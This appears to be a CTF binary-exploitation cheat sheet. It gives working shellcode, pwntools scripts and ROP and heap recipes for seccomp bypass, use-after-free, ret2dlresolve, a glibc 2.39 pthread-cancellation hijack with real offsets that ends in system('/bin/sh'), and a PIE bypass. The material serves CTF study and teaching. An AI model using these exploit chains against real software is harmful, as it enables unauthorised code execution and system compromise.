# CTF Pwn - Advanced Techniques

**See also:** [heap-techniques.md](heap-techniques.md) — House of Apple 2, House of Einherjar, House of Orange/Spirit/Lore/Force, heap grooming, custom allocator exploitation (nginx, talloc), classic unlink, musl libc heap, tcache stashing unlink

---

## Seccomp Advanced Techniques

### openat2 Bypass (New Age Pattern)

`openat2` (syscall 437, Linux 5.6+) frequently missed in seccomp filters blocking `open`/`openat`:
```python
# struct open_how { u64 flags; u64 mode; u64 resolve; }  = 24 bytes
# openat2(AT_FDCWD, filename, &open_how, sizeof(open_how))
```

### Conditional Buffer Address Restrictions

Seccomp `SCMP_CMP_LE`/`SCMP_CMP_GE` on buffer addresses:
- `read()` KILL if buf <= code_region + X → read to high addresses
- `write()` KILL if buf >= code_region + Y → write from low addresses

**Bypass:** Read into allowed region, `rep movsb` copy to write-allowed region:
```nasm
lea rsi, [r14 + 0xc01]   ; buf > code_region+0xc00 (passes read check)
xor rax, rax              ; __NR_read
syscall
mov r13, rax
lea rsi, [r14 + 0xc01]   ; src (high)
lea rdi, [r14 + 0x200]   ; dst (low, < code_region+0x400)
mov rcx, r13
rep movsb
mov rdi, 1
lea rsi, [r14 + 0x200]   ; buf < code_region+0x400 (passes write check)
mov rdx, r13
mov rax, 1                ; __NR_write
syscall
```

### Shellcode Construction Without Relocations (pwntools)

pwntools `asm()` fails with forward label references. Fix with manual jmp/call:

```python
body = asm('''
    pop rbx              /* rbx = address after call instruction */
    mov r14, rbx
    and r14, -4096       /* page-align for code_region base */
    mov rsi, rbx         /* filename pointer */
    /* ... rest of shellcode ... */
fail:
    mov rdi, 1
    mov rax, 60
    syscall
''')
call_offset = -(len(body) + 5)
call_instr = b'\xe8' + p32(call_offset & 0xffffffff)
jmp_instr = b'\xeb' + bytes([len(body)]) if len(body) < 128 else b'\xe9' + p32(len(body))
shellcode = jmp_instr + body + call_instr + b"filename.txt\x00"
# call pushes filename address onto stack, pop rbx retrieves it
```

### Seccomp Analysis from Disassembly

```c
seccomp_rule_add(ctx, action, syscall_nr, arg_count, ...)
```

`scmp_arg_cmp` struct: `arg` (+0x00, uint), `op` (+0x04, int), `datum_a` (+0x08, u64), `datum_b` (+0x10, u64)

SCMP_CMP operators: `NE=1, LT=2, LE=3, EQ=4, GE=5, GT=6, MASKED_EQ=7`

Default action `0x7fff0000` = `SCMP_ACT_ALLOW`

---

## rdx Control in ROP Chains

See [rop-and-shellcode.md](rop-and-shellcode.md#rdx-control-in-rop-chains) for full details and code examples.

---

## Use-After-Free (UAF) Exploitation

**Pattern:** Menu create/delete/view where `free()` doesn't NULL pointer.

**Classic UAF flow:**
1. Create object A (allocates chunk with function pointer)
2. Leak address via inspect/view (bypass PIE)
3. Free object A (creates dangling pointer)
4. Allocate object B of **same size** (reuses freed chunk via tcache)
5. Object B data overwrites A's function pointer with `win()` address
6. Trigger A's callback -> jumps to `win()`

**Key insight:** Both structs must be the same size for tcache to reuse the chunk.

```python
create_report("sighting-0")  # 64-byte struct with callback ptr at +56
leak = inspect_report(0)      # Leak callback address for PIE bypass
pie_base = leak - redaction_offset
win_addr = pie_base + win_offset

delete_report(0)              # Free chunk, dangling pointer remains
create_signal(b"A"*56 + p64(win_addr))  # Same-size struct overwrites callback
analyze_report(0)             # Calls dangling pointer -> win()
```

---

## JIT Compilation Exploits

**Pattern (Santa's Christmas Calculator):** Off-by-one in instruction encoding causes misaligned machine code.

**Exploitation flow:**
1. Find the boundary value that triggers wrong instruction form (e.g., 128 vs 127)
2. Misaligned bytes become executable instructions
3. Control `rax` to survive invalid dereferences (point to writable memory)
4. Embed shellcode as operand bytes of subtraction operations
5. Chain 4-byte shellcode blocks with 2-byte `jmp` instructions between them

**2-byte instruction shellcode tricks:**
- `push rdx; pop rsi` = `mov rsi, rdx` in 2 bytes
- `xor eax, eax` = 2 bytes (set syscall number)
- `not dl` = 2 bytes (adjust pointer)
- Use `sys_read` to stage full shellcode on RWX page, then jump to it

## Esoteric Language GOT Overwrite

**Pattern (Pikalang):** Brainfuck/Pikalang interpreter with unbounded tape allows arbitrary memory access.

**Exploitation:**
1. Tape pointer starts at known buffer address
2. Move pointer backward/forward to reach GOT entry (e.g., `strlen@GOT`)
3. Overwrite GOT entry byte-by-byte with `system()` address
4. Next call to overwritten function triggers `system(controlled_string)`

**Key insight:** Unbounded tape = arbitrary read/write primitive relative to buffer base.

## Heap Overlap via Base Conversion

**Pattern (Santa's Base Converter):** Number stored as string in different bases has different lengths.

**Exploitation:**
1. Store number in base with short representation (e.g., base-36)
2. Convert to base with longer representation (e.g., base-2/binary)
3. Longer string overflows into adjacent heap chunk metadata
4. Corrupted chunk overlaps with target allocation

**Limited charset constraint:** Only digits/letters available (0-9, a-z) limits writable byte values.

## Tree Data Structure Stack Underallocation

**Pattern (Christmas Trees):** Imbalanced binary tree causes stack buffer underallocation.

**Vulnerability:** Stack allocation based on balanced tree assumption (`2^depth` nodes), but actual traversal of imbalanced tree uses more stack than allocated buffer, causing overflow.

**Exploitation:** Craft tree structure that causes traversal to overflow buffer → overwrite return address → ret2win (partial overwrite if PIE).

---

## ret2dlresolve

**Pattern:** Forge `Elf64_Sym` and `Elf64_Rela` structures to trick the dynamic linker into resolving an arbitrary function (e.g., `system`) at the next PLT call. Bypasses ASLR without any libc leak.

```python
from pwn import *

# pwntools has built-in ret2dlresolve support
rop = ROP(elf)
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])

rop.read(0, dlresolve.data_addr)  # Read forged structures to known address
rop.ret2dlresolve(dlresolve)       # Trigger resolution

# Stage 1: Send ROP chain
io.sendline(flat({offset: rop.chain()}))

# Stage 2: Send forged dl-resolve payload
io.sendline(dlresolve.payload)
```

**Manual approach (understanding the internals):**
```python
# Forge at a writable address (e.g., .bss)
# 1. Fake Elf64_Rela: points PLT slot to our fake Elf64_Sym
# 2. Fake Elf64_Sym: st_name offset points to our "system" string
# 3. "system\x00" string

SYMTAB = elf.dynamic_value_by_tag('DT_SYMTAB')
STRTAB = elf.dynamic_value_by_tag('DT_STRTAB')
JMPREL = elf.dynamic_value_by_tag('DT_JMPREL')

# Calculate reloc_index so PLT stub pushes correct index
reloc_index = (fake_rela_addr - JMPREL) // 0x18  # sizeof(Elf64_Rela)

# Fake Elf64_Sym.st_name = offset from STRTAB to our "system" string
fake_sym_st_name = fake_string_addr - STRTAB
```

**Key insight:** ret2dlresolve works without ANY leak. It exploits the lazy binding mechanism: when a PLT function is called for the first time, the dynamic linker looks up the symbol name and resolves it. By forging the lookup structures, you can make it resolve any libc function. Use pwntools' `Ret2dlresolvePayload` for automation.

**Requirements:** Partial RELRO (Full RELRO resolves all symbols at load time, defeating this). Writable memory to place forged structures.

---

## Control Transfer Without a Return Address (pthread Cancellation)

**Pattern:** You have arbitrary read/write but no return address to hijack: `main` is a `for(;;)` loop that never returns, the GOT is full RELRO, and the ELF declares `IBT, SHSTK`, so return-address overwrites die on the shadow stack. glibc's asynchronous-cancellation slow path still hands control to an **indirect `jmp`** inside the libc `_Unwind_ForcedUnwind` wrapper, and CET polices `ret`, not this `jmp`.

```asm
; inside libc's _Unwind_ForcedUnwind wrapper
ror  $0x11, %rax          ; PTR_DEMANGLE
xor  %fs:0x30, %rax       ; pointer guard
jmp  *%rax                ; indirect jump - SHSTK never sees a return
```

The only IBT requirement is that the target starts with `endbr64`; `system` does.

### Trigger path (glibc 2.39)

```
read()/write()/usleep() ... any SYSCALL_CANCEL wrapper
  +- if (!__libc_single_threaded) __libc_enable_asynccancel()
  |    rcx = fs:0x10                  ; THREAD_SELF
  |    edx = [rcx + 0x308]            ; cancelhandling
  |    if (cancelhandling & CANCELED) __do_cancel()
  +- __pthread_unwind(exc = self + 0x670)
     +- _Unwind_ForcedUnwind()
        if (![libc + unwind_flag]) dlopen libgcc_s ...   ; avoided by writing the flag
        else rax = [static_unwind_struct + 8]
        ror 0x11 / xor fs:0x30 / jmp *rax                 ; rdi = self + 0x670
```

### The writes

| address | value |
|---|---|
| `fake_self + 0x308` | `8` (`cancelhandling`, CANCELED bit) |
| `fake_self + 0x670` | `"/bin/sh\0"` - becomes `rdi` at the `jmp` |
| `fs_base + 0x10` | `fake_self` (`THREAD_SELF`, **not** the CPU `fs_base` itself) |
| `libc + unwind_flag` | `1` - use the static unwind struct instead of `dlopen`ing libgcc_s |
| `libc + unwind_fptr` | `ROL(system ^ guard, 0x11)` |
| `libc + __libc_single_threaded` | `0` - **write last**; it is what routes the next syscall wrapper onto the slow path |

`guard = *(u64 *)(fs_base + 0x30)` must be read **before** `fs:0x10` is replaced, and
`rol(v, n) = ((v << n) | (v >> (64 - n)))`.

glibc 2.39 x86-64 (Ubuntu 24.04, BuildID `328820b908de8ea1ef79afa8995e302e819163d7`) worked example:
`system +0x58750`, `__libc_single_threaded +0x20b040`, `unwind flag +0x20b068`,
`static unwind struct +0x20b080` (fn ptr at `+8` = `+0x20b088`),
`__libc_enable_asynccancel +0x98630`, `_Unwind_ForcedUnwind wrapper +0x2a630`.

### Trigger and shell

Write the first five entries, then zero `__libc_single_threaded` and immediately perform a cancellable libc call - in a protocol daemon the next reply `write()` is enough. The reply never arrives (the shell owns the fd) so stop waiting for it:

```python
guard = rd(fs_base + 0x30)                      # read BEFORE touching fs:0x10
fake  = rd(fs_base + 0x10) + 0x100              # fake TCB carved out of the real one

wr(fake + 0x308, p32(8))                        # cancelhandling, CANCELED bit
wr(fake + 0x670, b"/bin/sh\x00")                 # rdi at the jmp
wr(fs_base + 0x10, p64(fake))                   # THREAD_SELF -> fake TCB
wr(libc + UNWIND_FLAG, p64(1))                  # static unwind struct, no libgcc_s dlopen
wr(libc + UNWIND_FPTR, p64(rol((libc + SYSTEM) ^ guard, 0x11)))
wr(libc + SINGLE_THREADED, p64(0))              # LAST: next syscall wrapper cancels
send_trigger()
time.sleep(0.4)
send(b"id; cat /flag*\n")                        # non-interactive shell, no prompt
```

### glibc version applicability

The recipe above is 2.36+; on older glibc the "make it look multi-threaded" step needs a different global.

| glibc | what the fast-path check reads | what the last write must do |
|---|---|---|
| **2.36+** | `SINGLE_THREAD_P` = `__libc_single_threaded_internal` (public alias `__libc_single_threaded`) | write `0` to `__libc_single_threaded` (the worked example above) |
| 2.32 - 2.35 | the variable exists (`<sys/single_threaded.h>` is new in 2.32), but `SINGLE_THREAD_P` still reads `tcbhead_t.multiple_threads` - `fs:0x18` on x86_64 - or the `__libc_multiple_threads` global where `SINGLE_THREAD_BY_GLOBAL` is defined | zeroing `__libc_single_threaded` does nothing; write a **non-zero** int to `fs:0x18` (or that global) |
| 2.26 - 2.31 | same check, and `__libc_single_threaded` does not exist yet | same: write a non-zero `fs:0x18` |
| 2.22 - 2.25 | `SYSCALL_CANCEL` exists, but `read`/`write` are still generated `.S` stubs marked `CANCELABLE` | chain is identical; find the wrapper by its `LIBC_CANCEL_ASYNC` call site instead of a `SYSCALL_CANCEL` use |
| < 2.22 | no `SYSCALL_CANCEL` macro at all | same as above; verify that the build's wrapper reaches `__libc_enable_asynccancel` |

On x86_64 `fs:0x18` sits between `fs:0x10` (`self`) and `fs:0x28` (`stack_guard`) in `tcbhead_t`, so one 4-byte write flips the process onto the multi-threaded path.

`SYSCALL_CANCEL` itself first appears in **glibc 2.22** (originally `SYSCALL_CANCEL(name, ...)`), was simplified to `SYSCALL_CANCEL(...)` in 2.25, and only since **2.26** do the `read`/`write` C wrappers use it. Cancellation of `read`/`write` is much older than the macro - it used to live in the `PSEUDO` assembly stubs - so "no `SYSCALL_CANCEL` in the disassembly" does not mean the call is not a cancellation point.

The concrete addresses in the worked example (`+0x20b040`, `+0x20b068`, `+0x20b088`, `cancelhandling +0x308`, `_Unwind_ForcedUnwind` wrapper `+0x2a630`) are for one specific 2.39 build; re-derive them per build with the steps below.

### Porting to another libc

1. `system`: `readelf -sW libc.so.6 | grep ' system@@'`.
2. `__libc_enable_asynccancel`: disassemble and find `mov %fs:0x10,%rax` / `mov 0x308(%rax),%edx` / `lea 0x308(%rax),%rdi`; the `0x308` `cancelhandling` offset moves between versions.
3. `_Unwind_ForcedUnwind` wrapper: find the function containing `call __libc_unwind_link_get` followed by `ror $0x11` / `xor %fs:0x30` / `jmp *%rax`; its `mov 0x8(%rax),%rax` identifies the static struct layout.
4. `__libc_single_threaded`: exported by most builds (`readelf -sW | grep single_threaded`), else find the `cmpb $0x0,...` in the `read`/`write` wrappers.
5. `unwind flag`: the global the wrapper tests before falling back to `dlopen`.

### Failure modes

| symptom | cause |
|---|---|
| silent death, no shell | guard read *after* `fs:0x10` was already replaced |
| crash at `jmp *%rax` | mangling direction - disguising needs `rol`, demangling is `ror`; or a wrong guard |
| normal reply, nothing happens | `__libc_single_threaded` still 1, or the call is not a cancellation point |
| crash before the trigger fires | fake TCB installed too early: any libc TLS access (errno, stack canary, malloc) lands in it |
| shell but no 4-byte reply | expected; the takeover happens inside the reply `write()` |

**When to recognize:** `main` never returns, full RELRO, `IBT`/`SHSTK` in `GNU_PROPERTY`, and the program loops on `read`/`write`/`recv` - returning is impossible but a cancellable libc call is guaranteed.

**References:** glibc `nptl/cancellation.c`, `sysdeps/pthread/unwind-forcedunwind.c`, `sysdeps/unix/sysv/linux/{read,write}.c`, `sysdeps/x86_64/pointer_guard.h`; QWNT 2026 `diagnosticd` (glibc 2.39), verified locally to `system("/bin/sh")` as root.

---

## Kernel Exploitation

For comprehensive kernel exploitation techniques, see [kernel.md](kernel.md). Quick reference:

- `modprobe_path` overwrite for root code execution (requires AAW)
- `tty_struct` kROP via fake vtable and stack pivot
- `userfaultfd` for deterministic race conditions
- Heap spray with `tty_struct`, `poll_list`, `user_key_payload`, `seq_operations`
- KASLR/FGKASLR/SMEP/SMAP/KPTI bypass techniques
- Kernel config recon checklist

**Basic patterns (userland-adjacent):**
- OOB via vulnerable `lseek` handlers
- Heap grooming with forked processes
- SUID binary exploitation via kernel-to-userland buffer overflow
- Check kernel config for disabled protections:
  - `CONFIG_SLAB_FREELIST_RANDOM=n` → sequential heap chunks
  - `CONFIG_SLAB_MERGE_DEFAULT=n` → predictable allocations

---

## 9-Byte test+je Timing Leak (hxp 2018)

**Pattern:** The shellcode slot is only 9 bytes — too small for a full read/write. Write a 7-byte `test BYTE PTR [rip+0x2], imm8` followed by a 2-byte `je 0` (infinite loop on zero flag). Read the flag one bit at a time by flipping the immediate, then close the socket and measure round-trip time: `<2 s` = crashed (bit differs from imm), `>2 s` = hung (bit matches, loop fired).

```asm
f6 05 02 00 00 00 X    test BYTE PTR [rip+0x2], X
74 fe                  je   0
```

**Key insight:** Tiny shellcode budgets can still leak a full flag if you turn the loop / crash distinction into a 1-bit channel. Any operation that hangs on one branch and crashes on the other works — `hlt`, page faults, or explicit infinite loops.

**References:** hxp CTF 2018 — yunospace, writeup 12570

---

## RtlCaptureContext Deterministic Windows Stack Leak (Insomnihack 2017)

**Pattern:** Need a stack leak on Windows with ASLR but no format string. `ntdll!RtlCaptureContext(&ctx)` writes the current register set (including `Rsp`) into a user-supplied `CONTEXT` struct. Call it once from attacker-chosen code, then read `ctx.Rsp` from the same buffer.

```c
CONTEXT ctx;
RtlCaptureContext(&ctx);
printf("rsp = %p\n", (void*)ctx.Rsp);
```

**Key insight:** Windows NT API has several "dump register state" helpers intended for unwinding and exception handling. They behave as deterministic info-leak primitives for exploitation because they copy `RSP` verbatim into user memory with no randomisation.

**References:** Insomnihack 2017 — winworld, writeup 12876

---

## IEEE 754 Double-as-Shellcode via Exponent Fixing (Kaspersky 2018)

**Pattern:** Challenge writes exactly six 8-byte IEEE 754 doubles into a buffer and then computes `(d1 + d2 + d3 + d4 + d5 + d6) / 6` — the result is executed. Force every summand to have exponent bits `0x4330` (`1075 = 1023 + 52`), which gives an exactly-representable 52-bit integer, so double addition behaves like integer addition with no rounding. Encode the target shellcode as an integer, pick `d6` so the sum hits it exactly.

```python
def shellcode_to_double(bytes_):
    # Pin exponent so the payload bits are preserved
    return struct.unpack('d', b'\x30\x43' + bytes_[:6])[0]

d1 = shellcode_to_double(sc[ 0: 6])
d2 = shellcode_to_double(sc[ 6:12])
d3 = shellcode_to_double(sc[12:18])
d4 = shellcode_to_double(sc[18:24])
d5 = shellcode_to_double(sc[24:30])
# d6 chosen so 6*target == d1+d2+d3+d4+d5+d6
target_int = int_from_shellcode(sc_full)
d6 = 6*target_int - (d1_int + d2_int + d3_int + d4_int + d5_int)
```

**Key insight:** IEEE 754 doubles are lossless integer containers whenever the exponent field is fixed at `bias + 52`. Any "you can only write N doubles" primitive is equivalent to "you can write N×6 bytes of raw data", as long as you control the exponent bits. Works identically for 32-bit floats (`bias + 23`) and long doubles.

**References:** Kaspersky Industrial CTF 2018 — doubles, writeups 12324, 12326

---

## PIE Bypass via Consistent glibc Load Base 0x56555000 (TAMUctf 2019)

**Pattern (pwn2):** PIE-enabled 32-bit ELF with no leak primitive. A function pointer on the stack is called after `strcpy`ing user input into a 30-byte buffer; overwriting the pointer lets us pick any code target — but the randomised base normally blocks picking `print_flag`. Observation: on the challenge runtime (and many default glibc configurations for i386 PIE binaries), the loader places the executable at the fixed base `0x56555000` across runs. That makes PIE effectively a known-offset: `print_flag = 0x56555000 + 0x6dc`, reachable without any leak.

```python
# `gdb -q ./pwn2` -> `info proc mappings`
# 0x56555000 0x56556000 0x1000    0x0 ./pwn2
# 0x56556000 0x56557000 0x1000    0x0 ./pwn2
# print_flag symbol offset: 0x6dc

from pwn import *

PIE_BASE = 0x56555000
print_flag = PIE_BASE + 0x6dc

payload  = cyclic(30)           # buffer(30) -> reaches the fn pointer slot
payload += p32(print_flag)      # overwrite var_C called after strcmp
io = remote('pwn.tamuctf.com', 4322)
io.sendline(payload)
io.interactive()
```

**Key insight:** 32-bit PIE on many distros emits `ET_DYN` with a stock `mmap_base` of `0x56555000` because `brk_randomization` and ASLR entropy are minimal. If `info proc mappings` shows the same base across multiple runs (in the challenge container or in gdb with `set disable-randomization on`), treat the "random" base as a constant. Always enumerate map bases before assuming a leak is required — the same trick applies to stacks started under `ulimit -s unlimited` (base becomes `0x7fff_f000` deterministically).

**References:** TAMUctf 2019 — pwn2, writeup 13423
